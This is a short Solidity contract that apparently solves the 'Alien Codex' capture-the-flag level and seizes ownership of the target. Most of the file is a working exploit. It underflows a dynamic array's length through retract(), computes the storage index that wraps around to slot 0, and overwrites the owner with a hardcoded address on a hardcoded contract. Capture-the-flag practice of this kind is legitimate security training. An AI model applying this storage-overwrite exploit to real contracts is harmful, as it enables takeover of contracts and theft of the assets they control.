// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*
You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help:
- Understanding how array storage works
- Understanding ABI specifications
- Using a very underhanded approach
*/


interface AlienCodex {
  function make_contact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHack {
    AlienCodex public alien = AlienCodex(0x494ec270c0BAEEA7442EA5863e129457FB9Aa8d3);

    constructor() public {
        uint codexIndex = (uint256(0) - 1) - uint(keccak256(abi.encode(1))) + 1;
        alien.make_contact();
        alien.retract();
        alien.revise(codexIndex, 0x00000000000000000000000043b02cdF22d0DE535279507CF597969Ce82198Af);
    }
}